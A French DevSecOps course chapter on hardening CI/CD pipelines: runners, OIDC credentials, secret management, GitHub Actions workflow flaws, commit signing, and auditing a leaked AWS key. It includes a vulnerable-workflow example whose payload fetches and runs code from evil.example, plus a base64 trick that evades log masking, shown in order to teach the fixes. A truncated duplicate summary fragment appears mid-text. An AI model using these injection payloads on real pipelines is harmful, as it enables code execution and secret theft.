---
title: Sécurisation de la chaîne CI/CD
chapter: 2
course: devsecops
difficulty: intermediate
duration: 75
tags: [devsecops, ci-cd, github-actions, gitlab-ci, oidc, secrets-management, poisoned-pipeline-execution, supply-chain]
ceh_modules: []
objectives:
  - Durcir les runners CI (éphémères vs persistants) et appliquer le moindre privilège aux credentials de pipeline
  - Comparer les approches de gestion des secrets (variables chiffrées, HashiCorp Vault, sealed-secrets) et choisir la bonne selon le contexte
  - Protéger les branches critiques et signer commits/tags (GPG, SSH ou gitsign)
  - Reconnaître et corriger les failles propres aux workflows (pull_request_target, injection d'expressions, actions non épinglées)
  - Auditer un pipeline pour détecter un secret cloud committé en clair et comprendre pourquoi l'historique Git le rend irrémédiable
---

## Introduction

Le cours "DevOps Fondamentaux" t'a donné les bases du CI/CD : pipelines, étapes de build, déploiement automatisé. Mais un pipeline qui fonctionne n'est pas forcément un pipeline sûr. La chaîne CI/CD est devenue une cible de choix pour les attaquants — compromettre un runner ou voler un token CI donne souvent un accès plus large et plus discret que d'attaquer l'application en production elle-même. Ce chapitre ne traite pas de la sécurité du code applicatif (couverte dans "Sécurité des Applications et des API") : il se concentre sur l'infrastructure et le pipeline eux-mêmes — comment isoler les runners, restreindre les credentials, gérer les secrets sans les exposer, et garantir l'intégrité de ce qui est mergé et déployé.

Tu verras notamment un cas réel et fréquent : un secret cloud (`AWS_SECRET_ACCESS_KEY`) committé en clair dans un fichier YAML de pipeline. C'est l'un des incidents DevSecOps les plus courants en entreprise, et il illustre parfaitement pourquoi la sécurité de la chaîne CI/CD ne peut pas être une réflexion après coup.

## Durcir les runners CI

Un runner CI est une machine (ou un container) qui exécute tes jobs de pipeline — checkout du code, build, tests, déploiement. S'il est compromis, l'attaquant hérite de tout ce que le runner peut faire : accès au code source, aux credentials injectés, et souvent au réseau interne.

<CompareTable
  titleA="Type de runner"
  titleB="Implication sécurité"
  rows={[
    { a: "Runner persistant (self-hosted, longue durée)", b: "Réutilisé entre plusieurs jobs et parfois plusieurs projets — une compromission ou un résidu (cache, fichier temporaire, process) survit d'un build à l'autre et peut affecter d'autres pipelines" },
    { a: "Runner éphémère (provisionné à la demande, détruit après le job)", b: "Chaque job démarre sur un environnement propre et est détruit immédiatement après — élimine la persistance d'une compromission et la contamination croisée entre projets" },
  ]}
/>

```yaml
# GitHub Actions — runner hébergé éphémère par défaut (recommandé)
jobs:
  build:
    runs-on: ubuntu-latest   # VM neuve à chaque exécution, détruite après le job

# GitLab CI — forcer l'éphémère avec des runners Docker/Kubernetes
build:
  tags: [docker-ephemeral]
  image: node:22-alpine
```

Pour les runners self-hosted, les solutions d'auto-scaling comme **Actions Runner Controller** (ARC) sur Kubernetes pour GitHub, ou l'exécuteur Kubernetes de GitLab Runner, créent un Pod neuf par job : on retrouve ainsi le caractère éphémère tout en restant dans son propre réseau. GitHub déconseille explicitement d'utiliser des runners self-hosted sur des dépôts publics, car n'importe qui peut ouvrir une pull request depuis un fork et faire exécuter du code sur la machine.

<WarningCallout>
Les runners self-hosted persistants restent nécessaires dans certains contextes (accès réseau interne, licences logicielles, matériel spécifique) — mais ils exigent une isolation renforcée : un job par container jetable, pas d'accès réseau non filtré vers l'infrastructure interne, et un nettoyage systématique de l'espace de travail entre deux jobs.
</WarningCallout>

En complément, isole toujours l'exécution des jobs eux-mêmes : pas de containers `--privileged`, un utilisateur non-root dans l'image du runner, et un réseau segmenté qui empêche un job compromis d'atteindre directement les systèmes de production.

## Le moindre privilège pour les credentials CI

Un pipeline a presque toujours besoin de credentials — pour pousser une image Docker, déployer sur un cloud, notifier un service tiers. Le piège classique est le token "God mode" : un seul jeton avec des droits d'administrateur complet, réutilisé pour tout, parce que c'est plus simple à configurer.

<CehCallout>
Dans un test d'intrusion ou un audit DevSecOps, un token CI sur-privilégié est souvent le chemin le plus court vers une compromission totale : il suffit de compromettre un seul pipeline (parfois via une dépendance ou un fork malveillant sur une pull request) pour hériter de droits qui dépassent largement le besoin réel du job.
</CehCallout>

Le principe du moindre privilège appliqué aux credentials CI se décline en trois règles concrètes :

```text
1. Scoper par environnement : un token pour le déploiement staging ≠ un token pour la production.
2. Scoper par action : un token qui pousse une image Docker n'a pas besoin de droits IAM sur le réseau ou la base de données.
3. Scoper par durée de vie : préférer des credentials temporaires (tokens OIDC à courte durée) à des clés statiques stockées indéfiniment.
```

```yaml
# Exemple : GitHub Actions + OIDC vers AWS, sans clé statique
permissions:
  id-token: write   # nécessaire pour l'échange OIDC
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy-staging-only
      aws-region: eu-west-3
      # Aucun AWS_SECRET_ACCESS_KEY stocké : un token temporaire est émis à chaque run
```

La séquence suivante détaille l'échange OIDC. Le point clé est la **condition de confiance** configurée côté cloud : le rôle n'est assumable que si le jeton provient du bon dépôt, de la bonne branche ou du bon environnement.

```mermaid
sequenceDiagram
    participant J as Job GitHub Actions
    participant G as Fournisseur OIDC GitHub
    participant S as AWS STS
    participant R as Ressources AWS
    J->>G: demande un jeton d'identité (id-token: write)
    G-->>J: JWT signé (sub = repo:acme/app:environment:production)
    J->>S: AssumeRoleWithWebIdentity(JWT, rôle ci-deploy)
    S->>S: vérifie signature, audience et condition sur le claim sub
    S-->>J: identifiants temporaires (expiration courte)
    J->>R: déploiement avec les identifiants temporaires
```

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/app:environment:production"
    }
  }
}
```

Une condition trop large, par exemple `repo:acme/*` avec `StringLike`, permettrait à n'importe quel dépôt de l'organisation, ou à n'importe quelle branche, d'assumer le rôle de production. C'est une erreur de configuration fréquemment relevée en audit.

<TipCallout>
L'authentification OIDC (OpenID Connect) entre le CI et le cloud provider élimine complètement le besoin de stocker des clés d'accès statiques : le fournisseur cloud fait confiance à l'identité du pipeline directement, et émet un jeton temporaire valable seulement le temps du job.
</TipCallout>

## La gestion des secrets en pipeline

Une fois le scoping des credentials pensé, reste la question de leur stockage et de leur injection dans le pipeline. Trois approches dominent, avec des compromis différents.

<CompareTable
  titleA="Approche"
  titleB="Fonctionnement et compromis"
  rows={[
    { a: "Variables chiffrées natives (GitHub/GitLab Secrets)", b: "Chiffrées au repos, injectées en variables d'environnement au runtime du job, masquées dans les logs — simple à mettre en place mais limité en rotation automatique et en granularité d'accès fine" },
    { a: "HashiCorp Vault", b: "Secrets centralisés, récupérés dynamiquement par le pipeline via un token à durée de vie très courte, avec rotation automatique et audit trail complet — plus robuste mais ajoute une dépendance d'infrastructure à opérer" },
    { a: "Kubernetes sealed-secrets", b: "Le secret est chiffré avec la clé publique d'un contrôleur avant d'être committé dans Git (GitOps-friendly), puis déchiffré uniquement par le contrôleur dans le cluster cible — adapté au déploiement GitOps mais ne couvre que les secrets destinés à Kubernetes" },
  ]}
/>

```bash
# GitHub Actions — secret injecté en variable d'environnement, jamais visible en clair dans les logs
echo "Déploiement en cours..."
aws s3 sync ./dist s3://mon-bucket --region eu-west-3
# AWS_ACCESS_KEY_ID et AWS_SECRET_ACCESS_KEY viennent de secrets.AWS_* , jamais écrits dans le fichier YAML
```

```yaml
# GitLab CI — jeton OIDC du job échangé contre un secret Vault à durée de vie courte
read-secret:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com   # audience attendue par Vault
  script:
    - export VAULT_TOKEN="$(vault write -field=token auth/jwt/login role=ci-pipeline jwt=$VAULT_ID_TOKEN)"
    - vault kv get -field=password secret/prod/database
```

Les anciennes variables prédéfinies `CI_JOB_JWT` et `CI_JOB_JWT_V2` de GitLab ont été supprimées dans GitLab 17.0 au profit du mot-clé `id_tokens`, qui permet de choisir l'audience du jeton. Si tu croises encore `CI_JOB_JWT` dans une documentation ou un pipeline, c'est le signe d'une configuration à mettre à jour. Côté Kubernetes, l'**External Secrets Operator** synchronise des secrets depuis Vault ou un gestionnaire cloud (AWS Secrets Manager, Azure Key Vault, Google Secret Manager) vers des objets Secret du cluster, et **SOPS** chiffre des valeurs dans des fichiers YAML versionnés à l'aide de clés KMS ou age.

<AuditCallout>
ISO 27001 (contrôle A.8.24, gestion des clés cryptographiques et des secrets) exige une traçabilité de l'accès aux secrets sensibles. Vault répond nativement à cette exigence grâce à son audit log ; les variables chiffrées natives d'une plateforme CI l'assurent plus partiellement (accès en lecture au secret non tracé au niveau du job).
</AuditCallout>

Quelle que soit l'approche, une règle ne souffre aucune exception : **un secret ne doit jamais apparaître en clair dans un fichier versionné**, qu'il s'agisse d'un pipeline YAML, d'un fichier de configuration, ou d'un commentaire de code.

## Les failles propres aux workflows GitHub Actions

Les plateformes CI ont leurs propres classes de vulnérabilités. Sur GitHub Actions, trois reviennent sans cesse en audit et dans les incidents publics.

### L'exécution de pipeline empoisonnée (Poisoned Pipeline Execution)

Le déclencheur `pull_request_target` s'exécute dans le contexte du dépôt cible, **avec accès aux secrets et un jeton en écriture**, même pour une pull request venant d'un fork. Il a été conçu pour des tâches qui ne touchent pas au code de la PR, comme poser un label. Le danger apparaît quand le workflow récupère et exécute le code de la PR :

```yaml
# DANGEREUX : un attaquant modifie package.json dans son fork (script "postinstall")
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # code non fiable du fork
      - run: npm install && npm test                         # s'exécute avec les secrets
```

```mermaid
flowchart LR
    A["Attaquant : fork + PR modifiant un script de build"] --> W["Workflow pull_request_target"]
    W --> C["checkout du code de la PR"]
    C --> X["exécution du script malveillant"]
    X --> S["lecture des secrets et du GITHUB_TOKEN en écriture"]
    S --> E["exfiltration, push de code, publication de paquet"]
```

Ce scénario correspond au risque **CICD-SEC-4** de l'OWASP. La correction consiste à utiliser `pull_request` (sans secrets pour les forks) pour tout ce qui exécute du code de la PR, et à réserver `pull_request_target` aux tâches qui ne l'exécutent jamais.

### L'injection d'expressions dans les scripts

Les expressions `${{ ... }}` sont remplacées textuellement **avant** l'exécution du shell. Si elles contiennent une donnée contrôlée par un attaquant (titre d'issue, nom de branche, corps de PR), elles permettent une injection de commande :

```yaml
# VULNÉRABLE : un titre de PR comme  a"; curl https://evil.example/x | sh; echo "  est exécuté
- run: echo "Titre : ${{ github.event.pull_request.title }}"

# CORRIGÉ : passer la valeur par une variable d'environnement, traitée comme une donnée
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Titre : $PR_TITLE"
```

### Les actions tierces non épinglées

`uses: tj-actions/changed-files@v45` fait confiance à un **tag mobile** que le propriétaire, ou un attaquant qui a compromis son compte, peut réécrire. C'est exactement ce qui s'est produit en mars 2025 (CVE-2025-30066). La seule référence immuable est le **SHA complet du commit** :

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Le commentaire garde la version lisible, et Dependabot ou Renovate savent mettre à jour ces SHA automatiquement en proposant une pull request. Des outils d'analyse statique dédiés aux workflows, comme **zizmor** ou **actionlint**, détectent les déclencheurs dangereux, les injections d'expressions et les actions non épinglées. L'action **harden-runner** de StepSecurity peut en plus surveiller, voire bloquer, les connexions réseau sortantes d'un job, ce qui aurait rendu visible l'exfiltration de Codecov.

<WarningCallout>
Un dernier réflexe : déclare `permissions:` au niveau du workflow avec le strict nécessaire (souvent `contents: read`) et règle la permission par défaut du `GITHUB_TOKEN` sur lecture seule dans les paramètres de l'organisation. Un job compromis avec un jeton en lecture seule ne peut ni pousser de code ni publier de release.
</WarningCallout>

## Protection des branches et signature des commits

Un pipeline sécurisé ne sert à rien si n'importe qui peut pousser directement sur la branche de production ou falsifier l'identité d'un auteur de commit.

```text
Règles de protection de branche à activer sur main/production :
- Pull request obligatoire avant merge (pas de push direct)
- Au moins une revue approuvée par un autre humain
- Statut CI vert obligatoire (tests + scan de sécurité) avant merge
- Interdiction du force-push et de la suppression de la branche
```

La signature GPG des commits et des tags ajoute une garantie d'intégrité : elle prouve cryptographiquement qu'un commit provient bien du détenteur de la clé privée, et non d'une identité usurpée (un `git commit --author` falsifié ne trompe personne face à une vérification de signature).

```bash
# Générer une clé GPG dédiée et l'associer à Git
gpg --full-generate-key
git config --global user.signingkey <ID_CLE>
git config --global commit.gpgsign true

# Signer un tag de release (bonne pratique avant tout déploiement en production)
git tag -s v1.4.0 -m "Release 1.4.0"
git verify-commit HEAD
git verify-tag v1.4.0
```

GPG n'est plus la seule option. Depuis Git 2.34, on peut signer avec une **clé SSH**, souvent déjà utilisée pour pousser, ce qui simplifie beaucoup la mise en place :

```bash
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgsign true
```

Le projet Sigstore propose aussi **gitsign**, qui signe les commits sans clé à long terme, avec un certificat éphémère lié à ton identité OIDC (compte GitHub, Google ou Microsoft) et journalisé dans le registre de transparence Rekor. Le chapitre 6 détaille ce modèle « keyless ».

<TipCallout>
GitHub et GitLab peuvent exiger que tous les commits d'une branche protégée soient signés ("Require signed commits") — combinée à la protection de branche, cette règle empêche qu'un commit non vérifié atteigne jamais la production, même en cas de compte compromis sans la clé privée correspondante.
</TipCallout>

## Cas réel : un secret cloud committé en clair

Le scénario suivant revient constamment en audit DevSecOps : un développeur presse le pas, ajoute une variable d'environnement directement dans le pipeline pour "faire fonctionner le déploiement", et commit le fichier sans y penser deux fois.

```yaml
# pipeline/deploy.yml — NE JAMAIS FAIRE CECI
deploy:
  stage: deploy
  script:
    - export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    - export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    - aws s3 sync ./dist s3://prod-bucket
```

<WarningCallout>
Ce n'est pas une simple erreur de style : c'est une compromission immédiate. Dès l'instant où ce commit est poussé, la clé est exposée à quiconque a accès au dépôt — et si le dépôt est public, potentiellement au monde entier, souvent repéré en quelques minutes par des bots qui scannent GitHub en continu à la recherche de motifs `AKIA`.
</WarningCallout>

Le point le plus mal compris : **supprimer le fichier ou corriger le commit suivant ne résout rien**. Git conserve l'intégralité de l'historique — la clé reste récupérable via `git log -p`, `git show`, ou un simple clone du dépôt, même des mois après sa "suppression" apparente. La seule remédiation valable est de considérer la clé comme définitivement compromise et de la **révoquer immédiatement** côté fournisseur cloud (IAM), puis d'en émettre une nouvelle avec un scope minimal — jamais de la "nettoyer" du code en espérant que ça suffise.

L'audit d'un dépôt pour ce type de fuite s'automatise :

```bash
# Recherche rapide et manuelle des motifs classiques de clés AWS
grep -rn "AKIA\|SECRET" pipeline/ k8s/ terraform/

# git-secrets : bloque les commits contenant des motifs de secrets connus (pré-commit hook)
git secrets --install
git secrets --register-aws
git secrets --scan-history

# trufflehog : scanne tout l'historique Git à la recherche de secrets à haute entropie
trufflehog git file://. --only-verified

# gitleaks : scanne l'historique Git avec plus d'une centaine de règles (versions 8.19 et suivantes)
gitleaks git --verbose .
```

```text
Finding:     export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Secret:      wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
RuleID:      aws-secret-access-key
Entropy:     4.62
File:        pipeline/deploy.yml
Line:        6
Commit:      3f9a2c1d...
Author:      dev@acme.example
Date:        2026-02-11T16:42:07Z
```

L'option `--only-verified` de trufflehog est précieuse : l'outil tente d'authentifier chaque secret trouvé auprès du service concerné et ne remonte que les secrets encore valides, ce qui élimine l'essentiel des faux positifs. Côté plateforme, la **push protection** de GitHub et la **secret push protection** de GitLab bloquent le push lui-même quand un motif de secret connu est détecté, avant même qu'il n'entre dans l'historique distant.

La réponse à incident suit toujours le même ordre, et c'est l'ordre qui compte :

```mermaid
flowchart LR
    D["Détection : scanner, alerte, signalement"] --> R["Révocation immédiate de la clé (IAM)"]
    R --> A["Analyse des journaux : CloudTrail, utilisation de la clé"]
    A --> N["Nouvelle clé à portée minimale, ou mieux : OIDC"]
    N --> H["Nettoyage de l'historique (git filter-repo) si nécessaire"]
    H --> P["Prévention : pre-commit, push protection, scan CI"]
```

<CehCallout>
En reconnaissance offensive, l'historique Git d'un dépôt (y compris les commits supprimés d'une branche mais toujours présents dans les objets Git) est une cible d'investigation classique — `git log --all`, les forks archivés, et les caches publics d'outils comme GitHub peuvent exposer un secret bien après sa suppression apparente du code actuel.
</CehCallout>

## Erreurs fréquentes

La première erreur est de **nettoyer l'historique avant de révoquer** la clé : pendant ce temps, la clé reste valide et déjà copiée par les bots. On révoque d'abord, on nettoie ensuite. La deuxième est d'**utiliser `pull_request_target` par commodité**, parce que `pull_request` n'a pas accès aux secrets pour les forks, sans mesurer que cela revient à exécuter du code étranger avec ces secrets.

On voit aussi des **conditions de confiance OIDC trop larges**, des **actions tierces référencées par `@main` ou par un tag**, et des **jetons `GITHUB_TOKEN` laissés en écriture par défaut**. Autre classique, compter sur le **masquage des secrets dans les logs** comme protection : le masquage ne fonctionne que sur la valeur exacte, et un `echo $SECRET | base64` contourne le filtre. Enfin, des **runners self-hosted partagés entre projets de niveaux de confiance différents** permettent à un projet peu sensible de compromettre le runner qui déploie la production.

 éliminent la persistance d'une compromission et la contamination croisée entre projets — à privilégier systématiquement quand c'est possible.
- Le moindre privilège s'applique aux credentials CI en les scopant par environnement, par action et par durée de vie ; l'authentification OIDC élimine le besoin de clés statiques.
- Les variables chiffrées natives, HashiCorp Vault et les sealed-secrets Kubernetes répondent à des besoins différents — Vault apporte rotation et audit trail, sealed-secrets s'intègre au GitOps.
- La protection de branche (pull request, revue obligatoire, CI verte) et la signature GPG des commits/tags garantissent qu'aucun code non vérifié n'atteint la production.
- Un secret committé en clair reste récupérable dans l'historique Git même après suppression du fichier — la seule remédiation valable est la révocation immédiate côté fournisseur cloud.

## Lab — Mise en Pratique

**Environnement** : Kali Linux (terminal Nyx Shell) — lab **devops-001, "Le Pipeline Compromis"** (catégorie devops)

<Steps steps={[
  { title: "Explorer le dépôt fourni", description: "Le dossier ~/data/ contient un instantané d'un pipeline GitHub Actions, des manifests Kubernetes, un Dockerfile et une configuration Terraform poussés sans revue de sécurité.", code: "ls -R data/" },
  { title: "Auditer le pipeline CI à la recherche d'un secret en clair", description: "Cherche les motifs classiques de clés cloud dans le fichier de pipeline — c'est le premier flag du lab.", code: "grep -rn \"SECRET\\|AKIA\" data/pipeline/" },
  { title: "Comparer les contextes de sécurité Kubernetes", description: "Parmi les deux déploiements du manifest, identifie celui qui tourne en mode privilégié et relève le tag de son image — c'est le second flag.", code: "grep -B5 -A2 \"privileged: true\" data/k8s/deployment.yaml" },
  { title: "Aller plus loin (bonus non noté)", description: "Examine le Dockerfile applicatif et la configuration Terraform pour d'autres mauvaises pratiques (ADD depuis une URL distante, exécution root, port SSH ouvert à 0.0.0.0/0, bucket S3 public), et formule la correction que tu proposerais en revue de code. En conditions réelles, `trivy config .` automatise une bonne partie de cet audit (l'ancien outil tfsec a été intégré à Trivy, qui est désormais l'outil recommandé)." },
  { title: "Bonus : scanner l'historique avec gitleaks", description: "Si le dossier est un dépôt Git, lance gitleaks sur tout l'historique et compare le résultat avec ton grep : gitleaks retrouve aussi les secrets supprimés dans des commits ultérieurs.", code: "cd data && gitleaks git --verbose ." },
  { title: "Bonus : auditer un workflow avec zizmor", description: "Écris un workflow volontairement vulnérable (pull_request_target avec checkout du head de la PR et une expression github.event.pull_request.title dans un run), puis analyse-le et lis les explications de chaque alerte.", code: "pipx install zizmor\nzizmor .github/workflows/" },
]} />

## À retenir

- Les runners CI éphémères éliminent la persistance d'une compromission et la contamination croisée entre projets — à privilégier systématiquement quand c'est possible.
- Le moindre privilège s'applique aux credentials CI en les scopant par environnement, par action et par durée de vie ; l'authentification OIDC élimine le besoin de clés statiques, à condition de restreindre précisément le claim `sub`.
- Les variables chiffrées natives, HashiCorp Vault et les sealed-secrets Kubernetes répondent à des besoins différents — Vault apporte rotation et audit trail, sealed-secrets s'intègre au GitOps ; sur GitLab, `id_tokens` remplace `CI_JOB_JWT`.
- `pull_request_target` combiné au checkout du code de la PR, l'injection d'expressions `${{ }}` et les actions non épinglées par SHA sont les trois failles de workflow à chercher en priorité.
- La protection de branche (pull request, revue obligatoire, CI verte) et la signature des commits/tags (GPG, SSH ou gitsign) garantissent qu'aucun code non vérifié n'atteint la production.
- Un secret committé en clair reste récupérable dans l'historique Git même après suppression du fichier — la seule remédiation valable est la révocation immédiate côté fournisseur cloud.


## Questions de Révision

1. Pourquoi un runner CI éphémère réduit-il l'impact d'une compromission par rapport à un runner persistant ?
2. Qu'apporte concrètement l'authentification OIDC entre un pipeline CI et un fournisseur cloud, par rapport à des clés d'accès statiques stockées en secret CI ?
3. Dans quel contexte HashiCorp Vault apporte-t-il un avantage net par rapport aux variables chiffrées natives d'une plateforme CI ?
4. Pourquoi la signature GPG des commits, combinée à la protection de branche, empêche-t-elle un compte compromis de faire atteindre du code non vérifié à la production ?
5. Pourquoi supprimer un fichier contenant un secret dans un commit ultérieur ne suffit-il pas à protéger ce secret ?
6. Quelle est la seule remédiation réellement valable une fois qu'un secret cloud a été committé en clair, même par erreur ?
7. Pourquoi un workflow déclenché par `pull_request_target` qui exécute `npm install` sur le code de la PR est-il critique, alors que le même workflow en `pull_request` ne l'est pas ?
8. Comment corriger un step `run: echo "${{ github.event.issue.title }}"`, et pourquoi la correction fonctionne-t-elle ?
9. Quelle condition de confiance écrirais-tu pour qu'un rôle cloud de production ne soit assumable que par l'environnement production d'un seul dépôt ?
